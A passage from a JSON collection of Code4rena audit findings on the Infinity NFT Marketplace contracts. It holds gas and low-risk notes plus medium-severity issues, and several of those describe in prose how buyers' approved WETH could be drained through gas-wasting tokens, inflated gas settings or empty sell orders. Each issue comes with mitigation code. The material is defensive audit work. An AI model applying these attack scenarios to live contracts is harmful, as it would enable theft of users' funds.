      "content": "\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).\n\n*There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, see the warden's [full report](https://github.com/code-423n4/2022-06-infinity-findings/issues/186).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-02-state-variables-only-set-in-the-constructor-should-be-declared-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4945",
      "title": "[G-01] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **\\~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n70      mapping(address => uint256) public userMinOrderNonce;\n71    \n72      /// @dev This records already executed or cancelled orders to prevent replay attacks.\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L70-L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "4944",
      "title": "[L-07] Timelock or maximum amount on updatePenalties",
      "impact": "LOW",
      "content": "\n`updatePenalties()` changes how much a user loses upon \"ragequiting\" - ie withdrawing their tokens from the staker without waiting for the vesting period. It currently does not have any timelock, or any maximum amount: the owner can set the penalties such that a user calling `rageQuit()` loses all their `Infinity` tokens (all would be transferred to `INFINITY_TREASURY`). Adding a timelock would provide more guarantees to users and reduces the level of trust required.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L369-L371)\n\n### Mitigation\n\nEither add a timelock to `updatePenalties()`, or add a maximum penalty check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-07-timelock-or-maximum-amount-on-updatepenalties",
      "tags": [],
      "finders": []
    },
    {
      "id": "4943",
      "title": "[L-06] Setters should check the input value",
      "impact": "LOW",
      "content": "\nSetters should check the input value - ie make revert if it is the zero address or zero\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351) There should be a check that the new threshold does not break the following: BRONZE < SILVER < GOLD < PLATINUM\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd non-zero checks - address or uint - to the setters aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-06-setters-should-check-the-input-value",
      "tags": [],
      "finders": []
    },
    {
      "id": "4942",
      "title": "[L-05] Receive function",
      "impact": "LOW",
      "content": "\nInfinityStaker.sol is not supposed to receive ETH. Instead of using a rescue function, remove `receive()` and `fallback()` altogether.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[fallback() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L55)\\\n[receive() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L57)\\\n[function rescueETH(address destination) external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\n\n### Mitigation\n\nRemove these functions, or include a call to `rescueETH` in `receive()`, so that a user that mistakenly sends ETH to the Staker retrieves it immediately.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-05-receive-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4941",
      "title": "[L-04] Payable functions when using ERC20",
      "impact": "LOW",
      "content": "\nThere should be a `require(0 == msg.value)` to ensure no Ether is being sent to the exchange when the currency used in an order is a ERC20 token.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nscope: `takeMultipleOneOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L305-L307), there is no check to see if `msg.value == 0`\n\nscope: `takeOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L346-L348), there is no check to see if `msg.value == 0`\n\n### Mitigation\n\nAdd `require(0 == msg.value)` in both condition blocks mentioned above.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-04-payable-functions-when-using-erc20",
      "tags": [],
      "finders": []
    },
    {
      "id": "4940",
      "title": "[L-03] Immutable addresses lack zero-address check",
      "impact": "LOW",
      "content": "\nConstructors should check the address written in an immutable address variable is not the zero address\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[WETH = \\_WETH](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L115)\n\n### Mitigation\n\nAdd a zero address check for `_WETH`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-03-immutable-addresses-lack-zero-address-check",
      "tags": [],
      "finders": []
    },
    {
      "id": "4939",
      "title": "[L-02] Check zero denominator",
      "impact": "LOW",
      "content": "\nWhen a division is computed, it must be ensured that the denominator is non-zero to prevent failure of the function call.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[((threeMonthLock - threeMonthVested) / THREE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L196)\\\n[((sixMonthLock - sixMonthVested) / SIX_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L197)\\\n[((twelveMonthLock - twelveMonthVested) / TWELVE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L198)\n\nAll these storage variables in the denominators are set by the owner in `updatePenalties()`, and can be `0` as there is no non-zero check.\n\n### Mitigation\n\nBefore doing these computations, add a non-zero check to these variables. Or alternatively, add a non-zero check in\n`updatePenalties()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-02-check-zero-denominator",
      "tags": [],
      "finders": []
    },
    {
      "id": "4938",
      "title": "[L-01] Event should be emitted in setters",
      "impact": "LOW",
      "content": "\nSetters should emit an event so that Dapps can detect important changes to storage.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nAll the functions editing the currencies and complications of the exchange should emit an event\\\n[function addCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function addComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1240)\\\n[function removeCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function removeComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nEmit an event in all setters.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-01-event-should-be-emitted-in-setters",
      "tags": [],
      "finders": []
    },
    {
      "id": "2786",
      "title": "[M-09] Malicious tokens can be used to grief buyers and cause loss of their WETH balance",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xalpharush_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L746>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L727>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1087>\n\n### Impact\n\nThe function `matchOneToOneOrders` transfers an arbitrary amount of WETH from the user, `buy.signer` ,  in its inner call to `_execMatchOneToOneOrders`. The amount charged to the user is calculated dynamically based off of the gas consumption consumed during the trace. Notably, this amount is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. For example, when a user purchases an ERC721 token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas. This scenario is unlikely given that a buyer would have to purchase a malicious token, but the impact would be devastating as any WETH that the buyer has approved to the exchange can be lost.\n\nThis vulnerability is potentially possible in these functions as well:<br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L236-L242><br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L787-L796>\n\n### Proof of Concept\n\nA buyer gives infinite WETH approval to the exchange contract and unknowingly purchases a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes *all* of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\n### Recommended Mitigation Steps\n\nAllow users to input a maximum fee/ gas cost they are willing to spend on each order. Pulling an arbitrary amount from a user's wallet without any restriction is a dangerous practice given that many users give large/ infinite approval to contracts.\n\nIn addition, manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1164323281):**\n > Thanks, we are adding a max price variable\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1181073834):**\n > This is a clever way to leverage safeTransferFrom to grief users. Accepting as Medium risk.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about the function `matchOneToOneOrders` in the InfinityExchange smart contract. The function transfers an arbitrary amount of WETH from the user, `buy.signer`, in its inner call to `_execMatchOneToOneOrders`. This amount is calculated dynamically based off of the gas consumption consumed during the trace, and is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. If a buyer purchases a malicious token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas, resulting in the buyer's WETH being sent to the protocol. \n\nProof of concept of this vulnerability is a buyer giving infinite WETH approval to the exchange contract and unknowingly purchasing a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes all of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\nTo mitigate this vulnerability, it is recommended to allow users to input a maximum fee/ gas cost they are willing to spend on each order. Manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/74",
      "tags": [],
      "finders": [
        "0xalpharush"
      ]
    },
    {
      "id": "2785",
      "title": "[M-08] Incorrect condition marks valid order as invalid",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain, also found by KIntern_\n\n\n`canExecMatchOrder` is having an incorrect check which makes a valid order as invalid. \n\n`doItemsIntersect` function is also checked on sell.nfts, buy.nfts which is incorrect. \n\n`doItemsIntersect` should only be checked in reference to constructedNfts.\n\n### Proof of Concept\n\n1.  Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints\\[0]/sell.constraints\\[0]/numConstructedItems is 1\n\n2.  Ideally this order should match since constructedNfts {A} is present in both buy and sell\n\n3.  But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell\n\n### Recommended Mitigation Steps\n\nRemove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1162975062):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/74a7d6b39dc441b5b496b74735a1b09b93bef12f\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1179814096):**\n > Some orders that should be matched would revert. Lowering this to Medium risk.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the code found at https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140. The bug is caused by an incorrect check which makes a valid order invalid. The check is done on sell.nfts and buy.nfts when it should only be done in reference to constructedNfts. The bug can be demonstrated by an example where buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1. In this case, the order should match since constructedNfts {A} is present in both buy and sell, but the order will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail due to item C not being present in sell. The recommended mitigation step is to remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/120",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern"
      ]
    },
    {
      "id": "2784",
      "title": "[M-07] Malicious governance can use `updateWethTranferGas` to steal WETH from buyers",
      "impact": "MEDIUM",
      "content": "_Submitted by shenwilly, also found by 0x29A, berndartmueller, BowTiedWardens, peritoflores, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1260-L1263>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L747>\n\n### Vulnerability Details\n\nA malicious or compromised governance can set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers.\n\nThere are two ways for governance to exploit this:\n\n*   When an order is being executed, governance can frontrun the transactions by setting `WETH_TRANSFER_GAS_UNITS` to a very high amount.\n*   Set `WETH_TRANSFER_GAS_UNITS` to a very high amount, and execute trades against active buy orders. As long as the value of WETH to steal is higher than the cost to prepare the NFTs to sell, it is profitable to do so.\n\n### Proof of Concept\n\n*   `WETH_TRANSFER_GAS_UNITS` is set to `50000`.\n*   Alice has 100 WETH and 100 USDC. She approved infinite allowance to `InfinityExchange`.\n*   Alice signs a buy order to buy a FakePunk NFT with 100 USDC price.\n*   Malicious governance sets `WETH_TRANSFER_GAS_UNITS` to a very high amount such that the [gasCost](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739) calculation equals 100 WETH.\n*   Governance then bought a FakePunk in open market, and fills Alice's order.\n*   Alice received the NFT but paid 100 WETH as gas cost.\n\n### Recommended Mitigation Steps\n\nSet a sanity check in `updateWethTranferGas` so governance can't set it to unreasonable value. Consider using timelock for setting governance settings.\n\n    function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n        require(_wethTransferGasUnits <= 100000, \"gas unit must not be higher than 100000\");\n        WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n        emit NewWethTransferGasUnits(_wethTransferGasUnits);\n    }\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-infinity-findings/issues/127)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/127#issuecomment-1181006146):**\n > When a transaction is sent by the matching engine, the user pays for the gas costs of their portion of that call. There's overhead in actually getting the money from the user in WETH, which is estimated with WETH_TRANSFER_GAS_UNITS. That value is currently uncapped so the admin could increase it significantly, impacting users who signed orders back when that value was more reasonably assigned.\n> \n> Agree with Medium risk here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the InfinityExchange smart contract. It is possible for a malicious or compromised governance to set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers. There are two ways for governance to exploit this: when an order is being executed, they can frontrun the transactions by setting the WETH_TRANSFER_GAS_UNITS to a very high amount, or set the WETH_TRANSFER_GAS_UNITS to a very high amount and execute trades against active buy orders. A proof of concept was provided, in which the WETH_TRANSFER_GAS_UNITS was set to 50000, Alice had 100 WETH and 100 USDC, and she approved infinite allowance to the InfinityExchange. Malicious governance then set the WETH_TRANSFER_GAS_UNITS to a very high amount, bought a FakePunk in the open market, and filled Alice's order. As a result, Alice received the NFT but paid 100 WETH as gas cost.\n\nThe recommended mitigation steps are to set a sanity check in the updateWethTranferGas function so governance can't set it to unreasonable values, and consider using a timelock for setting governance settings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/127",
      "tags": [],
      "finders": [
        "VAD37",
        "BowTiedWardens",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "0x29A"
      ]
    },
    {
      "id": "2783",
      "title": "[M-06] Bug in `MatchOneToManyOrders` may cause tokens theft",
      "impact": "MEDIUM",
      "content": "_Submitted by PwnedNoMore_\n\nThe `MatchOneToManyOrders` does not check whether a given sell order is malicious, i.e., containing no NFT tokens but still requiring payment.\n\nThis may cause the sellers to maliciously profit.\n\nFor example, we have a `buyOrder` and a set of sell orders `[sellOrder0, sellOrder1, sellOrder2]`. Originally, they match well but with a legal price gas (which is common in the real world), i.e., `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2])` can be successfully processed.\n\nHowever, If the hacker proposes another `sellOrder3` which sells nothing but requests money/tokens. The `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2, sellOrder3])` will also succeed and the hacker does not need to send out any NFT token but grabs a considerable gain.\n\n### Attack Scenario\n\nThere are two possible attack scenarios.\n\n#### The `MATCH_EXECUTOR` is not in a good faith\n\n`MATCH_EXECUTOR` can always gain profit by leveraging this vulnerability. That is, every time the executor proposes a `MatchOneToManyOrders`, it can add one more *EMPTY* order to gain the profit.\n\nIt is one kind of centralization issue. All the processes should happen in a trust-less environment.\n\n#### Hackers can brute force the price gaps by sending out a large amount of *EMPTY* sell orders\n\nNote that creating an order happens off-chain. That means, the hacker can send out a large amount of *EMPTY* orders without paying any gas fee.\n\nOnce the executor picks any of the malicious orders, the hacker can gain the profit without a loss of NFT tokens.\n\nThis vulnerability also affects `matchOrders`.\n\n### Proof of Concept\n\nFor full details, see [original submission](https://github.com/code-423n4/2022-06-infinity-findings/issues/65).\n\n### Recommended Mitigation Steps\n\nTo mitigate the issue entirely, I would suggest banning any empty NFT transfers.\n\nFor example, `numNfts` must be bigger than zero [here](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1042). Also make sure the ERC1155 transferring at least 1 item.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1162896366):**\n> Please check this: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n> \n> No more ERC1155 either.\n> \n> The loop that transfers NFTs already checks for non empty array\n> \n> Not sure of the assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1179750238):**\n> This is a great report, appreciate the detail and the PoC code.\n> \n> Given that the call must originate from the match executor, it seems unlikely that it would match with an empty sell order. Additionally it should be easy to filter these when submitted off-chain. With that in mind, lowering this to a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed concerning the `MatchOneToManyOrders` function in the code-423n4/2022-06-infinity repository. The bug allows malicious actors to profit without sending out any Non-Fungible Tokens (NFTs). This could be done by creating a sell order that requires payment but contains no NFTs. \n\nThe bug affects both the `MatchOneToManyOrders` and `matchOrders` functions. An attack scenario could be the `MATCH_EXECUTOR` taking advantage of the vulnerability by adding an *EMPTY* order to gain a profit, or a hacker sending out a large amount of *EMPTY* orders without paying any gas fee. The bug has been confirmed using manual inspection and a proof of concept script.\n\nThe recommended mitigation step is to ban any empty NFT transfers, such as making sure `numNfts` is bigger than zero and that the ERC1155 is transferring at least 1 item.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/65",
      "tags": [],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2782",
      "title": "[M-05] ETH mistakenly sent over with ERC20 based `takeOrders` and `takeMultipleOneOrders` calls will be lost",
      "impact": "MEDIUM",
      "content": "_Submitted by obtarian, also found by 0xsanson, cccz, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n### Vulnerability details\n\n`takeOrders()` and `takeMultipleOneOrders()` are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.\n\nSetting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.\n\n### Proof of Concept\n\nBoth takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nWhen `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.\n\n### Recommended Mitigation Steps\n\nConsider adding the check for `msg.value` to be zero for the cases when it is not utilized:\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    } else {\n      require(msg.value == 0, 'non-zero ETH value');\n    }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/346)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/346#issuecomment-1179723118):**\n > When accepting an order using ERC20 tokens, any ETH included will be accepted as exchange fees instead of reverting the tx or refunding to the user.\n> \n> This is a result of user error, but leads to a direct loss of funds. Accepting as a Medium risk submission.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of the InfinityExchange.sol contract, which could potentially lead to a user permanently losing their ETH funds. This bug occurs when a user attempts to make an order using ETH, and the `currency` passed in the call is a ERC20 token. In this case, the `msg.value` will be permanently frozen within the contract, as the code only checks that `msg.value` is enough to cover the order's `totalPrice`.\n\nThe severity of this bug has been set to medium, as it is a permanent fund freeze scenario that is conditional on a user mistake, and the probability of it occurring is deemed high enough as the same functions are used for both ETH and ERC20 orders.\n\nTo mitigate this bug, the code should be modified to include a check for `msg.value` to be zero for cases when it is not utilized. The recommended code is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/346",
      "tags": [],
      "finders": [
        "cccz",
        "obtarian",
        "VAD37",
        "0xsanson"
      ]
    },
    {
      "id": "2781",
      "title": "[M-04] Fund loss or griefing in all order matching functions [`matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()`] because condition `(seller != buyer )` is not checked in any of them",
      "impact": "MEDIUM",
